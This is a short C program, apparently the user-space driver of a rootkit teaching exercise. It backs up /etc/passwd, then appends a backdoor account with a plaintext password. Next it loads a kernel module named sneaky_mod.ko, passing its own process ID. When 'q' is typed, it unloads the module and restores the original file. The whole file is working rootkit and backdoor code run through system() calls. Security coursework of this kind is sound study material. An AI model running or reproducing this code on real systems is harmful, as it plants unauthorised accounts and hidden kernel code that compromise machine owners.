#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


int main(void){
  // 1. print its own process ID
  printf("sneaky_process pid = %d\n", getpid());

  // 2. copy the /etc/passwd file (used for user authentication) to a new file: /tmp/passwd
  //open the /etc/passwd file and print a new line to the end of the file
  system("cp /etc/passwd /tmp/passwd");
  system("echo \'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\' >> /etc/passwd");
  
  // 3. load the sneaky module (sneaky_mod.ko)
  char message[80];
  sprintf(message, "insmod sneaky_mod.ko pid = %d", getpid());
  system(message);

  // 4. reading a character at a time from the keyboard until it receives the character ‘q’ (for quit)
  int inputChar;
  do{
    inputChar = getchar();
  }while (inputChar != 'q');

  // 5. unload sneaky module
  system("rmmod sneaky_mod");

  // 6. restore the /etc/passwd file by copying /tmp/passwd to /etc/passwd
  system("cp /tmp/passwd /etc/passwd");
  system("rm -rf /tmp/passwd");

  exit(EXIT_SUCCESS);
}